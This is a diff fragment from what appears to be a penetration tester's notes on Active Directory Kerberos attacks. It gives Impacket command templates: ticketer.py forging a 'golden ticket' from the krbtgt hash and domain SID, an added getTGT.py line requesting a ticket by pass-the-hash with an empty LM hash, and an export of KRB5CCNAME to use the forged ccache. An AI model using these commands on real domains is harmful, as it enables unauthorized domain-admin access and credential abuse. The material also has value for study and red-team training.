@@ -2,6 +2,9 @@ ticketer.py with krbgt account, we can create any ticket to use with kerberos an
 
 ticketer.py -nthash {kerbero or service nthash} -domain-sid {domain-sid} -domain {domain} {USER}
 
+To create a ticket TGT with any account and his hash:
+getTGT.py -hashes '{lmhash(not 0)usually aad3b435b51404eeaad3b435b51404ee}:{nthash}' {DOMAIN}/{USER}
+
 The command below creates a ticket known golden ticket if kerberos was used that is like a domain admin. It creates a file named user.ccache. This file only can be used with linux, if you want to use this as windows you will need to change the ticket to windows. search in google.
 
 export KRB5CCNAME='{USER}.ccache'
